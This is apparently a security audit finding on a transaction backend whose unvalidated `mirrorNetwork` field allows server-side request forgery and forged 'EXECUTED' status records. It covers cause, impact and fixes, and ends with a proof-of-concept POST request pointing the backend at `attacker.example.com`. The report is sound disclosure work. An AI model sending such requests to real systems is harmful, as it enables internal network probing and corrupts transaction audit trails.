# Audit Report

## Title
Unvalidated `mirrorNetwork` Field Enables SSRF and False Transaction Execution State

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any arbitrary string. The backend uses this attacker-controlled value to open a live gRPC connection to an external host (SSRF). The same value is persisted verbatim and later re-used by `ExecuteService._executeTransaction` to actually submit the transaction, meaning a transaction can be "executed" against an attacker-controlled node, corrupting its status record.

## Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` decorates `mirrorNetwork` only with `@IsNotEmpty()` and `@IsString()`. There is no `@IsIn([...])`, `@IsEnum(...)`, or any other constraint restricting the value to the known networks (`mainnet`, `testnet`, `previewnet`, `local-node`). [1](#0-0) 

**Step 1 — backend opens a gRPC connection to the attacker-supplied URL:**

`createTransactions` passes `dtos[0].mirrorNetwork` directly to `getClientFromNetwork` without any sanitization. [2](#0-1) 

Inside `getClientFromNetwork`, any value that does not match the four known constants falls through to the `default` branch, which constructs a live gRPC client pointed at the attacker-controlled host and immediately executes an `AddressBookQuery` against it. [3](#0-2) 

The attacker's server controls the address book returned, so `getNodeAccountIdsFromClientNetwork` returns attacker-chosen node IDs, and the subsequent `isTransactionValidForNodes` check passes for any node IDs the attacker embeds in the fake address book. [4](#0-3) 

**Step 2 — the malicious `mirrorNetwork` is persisted:**

After validation, `mirrorNetwork: data.mirrorNetwork` is stored verbatim in the `Transaction` row. [5](#0-4) 

**Step 3 — execution uses the stored malicious value:**

`ExecuteService._executeTransaction` calls `getClientFromNetwork(transaction.mirrorNetwork)` using the persisted value, submitting the transaction to the attacker-controlled node rather than the real Hedera network. [6](#0-5) 

The attacker-controlled node can return any receipt, causing the transaction row to be updated with a `EXECUTED` status and an attacker-chosen `statusCode`. [7](#0-6) 

## Impact Explanation

**SSRF:** The backend server makes an outbound gRPC connection to an arbitrary attacker-controlled host. This can be used to probe internal network services, enumerate internal infrastructure, or reach services not exposed to the internet (e.g., internal metadata endpoints, databases, or other microservices reachable from the backend container).

**Integrity corruption:** A transaction's `status` and `statusCode` fields are set based on the receipt returned by the attacker-controlled node. This corrupts the audit trail and can cause the application to believe a transaction was successfully executed on the real Hedera network when it was not — or vice versa.

## Likelihood Explanation

Any authenticated user of the application can trigger this by submitting a `POST /transactions` request with an arbitrary `mirrorNetwork` value. No elevated privileges are required beyond a valid user account. The exploit is straightforward and requires no special tooling beyond a standard HTTP client.

## Recommendation

1. **Add an allowlist validator** to `CreateTransactionDto.mirrorNetwork`. Use `@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])` or a custom `@IsEnum(...)` decorator. If custom networks must be supported, enforce a strict URL format and restrict to a configurable allowlist set by administrators, not end users.
2. **Validate consistency across a batch**: `createTransactions` currently only reads `dtos[0].mirrorNetwork` for the client but stores each DTO's own `mirrorNetwork`. Ensure all DTOs in a batch share the same validated network value.
3. **Defense in depth**: In `getClientFromNetwork`, consider rejecting any value that does not match the known constants at the library level as well, so callers cannot accidentally bypass DTO-level validation.

## Proof of Concept

```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_user_token>
Content-Type: application/json

{
  "name": "test",
  "description": "ssrf poc",
  "transactionBytes": "<valid_base64_encoded_transaction>",
  "creatorKeyId": 1,
  "signature": "<valid_signature>",
  "mirrorNetwork": "attacker.example.com"
}
```

1. The backend calls `getClientFromNetwork("attacker.example.com")`.
2. `getClientFromNetwork` falls through to the default branch and calls `MirrorNetworkGRPC.fromBaseURL("attacker.example.com")`, then executes an `AddressBookQuery` against `attacker.example.com` — the attacker's gRPC server receives the connection (SSRF).
3. The attacker's server returns a crafted `NodeAddressBook` containing attacker-chosen node account IDs.
4. `isTransactionValidForNodes` passes because the transaction's node IDs match the fake address book.
5. `mirrorNetwork: "attacker.example.com"` is stored in the `Transaction` row.
6. When the transaction is later executed, `_executeTransaction` calls `getClientFromNetwork("attacker.example.com")` again and submits the transaction to the attacker's node, which returns a crafted receipt marking the transaction as `EXECUTED` with any desired `statusCode`.
